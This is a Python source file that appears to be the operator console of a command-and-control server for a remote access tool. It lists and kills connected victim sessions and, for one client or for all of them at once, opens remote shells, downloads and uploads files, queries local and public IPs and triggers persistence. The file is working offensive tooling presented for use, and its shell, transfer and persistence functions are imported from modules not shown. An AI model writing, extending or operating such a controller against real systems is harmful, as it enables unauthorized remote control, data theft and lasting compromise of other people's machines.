from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.completion import WordCompleter
from src.ui.colors import Colors as cl
from src.utils.client_handler import get_client_by_id, list_clients, clients, handle_client, remove_client
from src.ui.help import show_main_help, show_client_help, show_broadcast_help
from src.utils.net_io import recv, send
from src.utils.persistence import persistence
import json
import time
from src.modules.shell_module import stream_shell, stream_broadcast_shell
from src.modules.file_transfer import download, upload



def main_loop(sock):
    cmd_commands = ["sessions", "broadcast", "exit", "help"]  
    completer = WordCompleter(cmd_commands)  
    cmd_session = PromptSession(completer=completer, history=InMemoryHistory())  

    while True:  
        try:  
            cmd = cmd_session.prompt("cmd> ")  
            if cmd == "exit":  
                if cmd == "exit":
                    confirm = input(f"{cl.yellow}[?] Exit server? (y/n): {cl.reset}").lower()
                    if confirm == 'y':
                        print(f"{cl.yellow}[*] Exiting...{cl.reset}")
                        sock.close()
                        exit()

            elif cmd == "help":
                show_main_help()

            elif cmd == "listen":
                print(f"{cl.yellow}[*] Waiting for a client to connect...{cl.reset}")
                handle_client(sock)

            elif cmd.startswith("sessions kill "):
                choice = cmd[14:].strip()
                cl_info = get_client_by_id(clients, choice)
                send(cl_info['socket'],"kill")
                remove_client(choice)

            elif cmd.startswith("sessions "):
                choice = cmd[8:].strip()
                cl_info = get_client_by_id(clients, choice)
                if cl_info['status'] == "online":
                    print(f"{cl.cyan}[+] Switching to client {cmd}{cl.reset}")
                    client_loop(cl_info)
                else:
                    raise Exception("The client is offline")
            
            elif cmd.strip() == "sessions":
                list_clients(clients) 

            elif cmd.strip() == "broadcast": 
                broadcast_loop(clients)
            else:
                print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
        except KeyboardInterrupt:  
            continue 
        except Exception as e:
            print(f"{cl.red}[!] Cmd error: {e}{cl.reset}")

def client_loop(client_info):
    """Handles the client-specific command loop"""
    cl_prompt = f"client_{client_info['ip']}> "
    cl_commands = ["shell", "download", "upload", "getip", "help", "back"]  
    completer = WordCompleter(cl_commands)  
    cl_session = PromptSession(completer=completer, history=InMemoryHistory())
    
    while True:
        try:
            cmd = cl_session.prompt(cl_prompt).strip()

            if cmd == "shell":
                send(client_info['socket'], cmd)
                stream_shell(client_info['socket'], client_info['hostname'])
                continue
                
            elif cmd.startswith("download "):
                download(client_info['socket'], cmd)
                    
            elif cmd.strip() == "upload":
                upload(client_info['socket'], cmd)
                
            elif cmd == "getip":
                print(f"{cl.cyan}[*] Requesting IP information...{cl.reset}")
                send(client_info['socket'], cmd)
                data = recv(client_info['socket'])
                if data:
                    ip_info = json.loads(data.decode())
                    print(f"{cl.purple}Local IP:{cl.reset}\t {ip_info.get('lip', 'unknown')}")
                    print(f"{cl.purple}Public IP:{cl.reset}\t {ip_info.get('pip', 'unknown')}")
                continue

            elif cmd == "persistence":
                print(f"{cl.cyan}[*] Trying persistence...{cl.reset}")
                persistence(client_info, cmd)
                

            elif cmd == "back":
                print(f"{cl.blue}[+] Returning to main session{cl.reset}")
                break
                
            elif cmd == "help":
                show_client_help()
                continue
                
            elif cmd:
                print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
                
        except KeyboardInterrupt:
            print(f"\n{cl.yellow}[!] Type 'back' to return to main session{cl.reset}")
            continue

def broadcast_loop(clients):
    """Handles broadcasting commands to all users"""
    br_commands = ["shell", "upload", "help", "back"]  
    completer = WordCompleter(br_commands)  
    br_session = PromptSession(completer=completer, history=InMemoryHistory())
    
    while True:
        try:
            cmd = br_session.prompt("broadcast> ")

            if cmd == "back":
                print(f"{cl.blue}[+] Returning to main session{cl.reset}")
                return
            
            elif cmd == "help":
                show_broadcast_help()
                continue

            if cmd == "shell":
                    stream_broadcast_shell(clients, cmd)

            for id, client_info in clients.items():
                time.sleep(0.5)
                if cmd.strip() == "upload":
                    print(f"{cl.cyan}[*] {client_info['hostname']}{cl.reset}")
                    upload(client_info['socket'], cmd)
                    
                elif cmd == "getip":
                    print(f"{cl.cyan}[*] Requesting IP information...{cl.reset}")
                    send(client_info['socket'], cmd)
                    data = recv(client_info['socket'])
                    if data:
                        ip_info = json.loads(data.decode())
                        print(f"{cl.purple}Hostname:{cl.reset}\t {client_info['hostname']}")
                        print(f"{cl.purple}Local IP:{cl.reset}\t {ip_info.get('lip', 'unknown')}")
                        print(f"{cl.purple}Public IP:{cl.reset}\t {ip_info.get('pip', 'unknown')}")
                    
        
            #print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
                
        except KeyboardInterrupt:
            print(f"\n{cl.yellow}[!] Type 'back' to return to main session{cl.reset}")
            continue